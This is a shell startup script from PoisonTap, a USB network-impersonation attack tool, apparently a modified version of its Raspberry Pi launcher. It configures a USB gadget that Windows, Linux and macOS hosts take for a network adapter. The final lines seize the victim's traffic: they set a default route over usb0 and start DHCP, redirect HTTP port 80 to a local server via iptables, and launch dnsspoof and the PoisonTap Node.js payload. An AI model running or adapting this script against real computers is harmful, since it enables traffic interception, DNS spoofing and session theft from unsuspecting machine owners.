#!/bin/sh
#
# PoisonTap
#  by samy kamkar
#  http://samy.pl/poisontap
#  01/08/2016

# Edited pi_startup.sh to try to overcome the problem of windows not auto loading the driver.
# configuration idea for the dual rdnis/CDC gadget and correct microsoft code
# thanks to ev3 https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh

# Defining some variables

g=/sys/kernel/config/usb_gadget/poisontap # Gadget config directory
device="pTap.1.auto"
usb_ver="0x0200" # USB 2.0
dev_class="2" # Communications
vid="0x1d6b" # Linux Foundation
pid="0x0104" # Multifunction Composite Gadget
manuf="Samy Kamkar" 
prod="PoisonTap" 
pwr="250" 
cfg1="RNDIS"
cfg2="CDC"
dev_mac1="42:61:64:55:53:42"
host_mac1="48:6f:73:74:50:43"
dev_mac2="42:61:64:55:53:44"
host_mac2="48:6f:73:74:50:45"
ms_vendor_code="0xcd" # Microsoft
ms_qw_sign="MSFT100" # also Microsoft (if you couldn't tell)
ms_compat_id="RNDIS" # matches Windows RNDIS Drivers
ms_subcompat_id="5162001" # matches Windows RNDIS 6.0 Driver

# Creating the usb gadget

mkdir ${g}
echo "${usb_ver}" > ${g}/bcdUSB
echo "${dev_class}" > ${g}/bDeviceClass
echo "${vid}" > ${g}/idVendor
echo "${pid}" > ${g}/idProduct
mkdir ${g}/strings/0x409
echo "${manuf}" > ${g}/strings/0x409/manufacturer
echo "${prod}" > ${g}/strings/0x409/product
echo "${serial}" > ${g}/strings/0x409/serialnumber

# Creating the windows config, RDNIS will be used with Microsoft specific 
# extensions in order to auto load the correct driver

mkdir ${g}/configs/c.1
echo "${pwr}" > ${g}/configs/c.1/MaxPower
mkdir ${g}/configs/c.1/strings/0x409
echo "${cfg1}" > ${g}/configs/c.1/strings/0x409/configuration
echo "1" > ${g}/os_desc/use
echo "${ms_vendor_code}" > ${g}/os_desc/b_vendor_code
echo "${ms_qw_sign}" > ${g}/os_desc/qw_sign

# Create the RNDIS function, including the Microsoft-specific bits

mkdir ${g}/functions/rndis.usb0
echo "${dev_mac1}" > ${g}/functions/rndis.usb0/dev_addr
echo "${host_mac1}" > ${g}/functions/rndis.usb0/host_addr
echo "${ms_compat_id}" > ${g}/functions/rndis.usb0/os_desc/interface.rndis/compatible_id
echo "${ms_subcompat_id}" > ${g}/functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id

# Creating the CDC config for Linux and OS X

mkdir ${g}/configs/c.2
echo "${pwr}" > ${g}/configs/c.2/MaxPower
mkdir ${g}/configs/c.2/strings/0x409
echo "${cfg2}" > ${g}/configs/c.2/strings/0x409/configuration

# Create the CDC function

mkdir ${g}/functions/ecm.usb0
echo "${dev_mac2}" > ${g}/functions/ecm.usb0/dev_addr
echo "${host_mac2}" > ${g}/functions/ecm.usb0/host_addr

# Linking the functions

ln -s ${g}/functions/rndis.usb0 ${g}/configs/c.1
ln -s ${g}/configs/c.1 ${g}/os_desc
ln -s ${g}/functions/ecm.usb0 ${g}/configs/c.2

# Binding the USB gadget

echo "${device}" > ${g}/UDC


ifup usb0
ifconfig usb0 up
/sbin/route add -net 0.0.0.0/0 usb0
/etc/init.d/isc-dhcp-server start

/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 
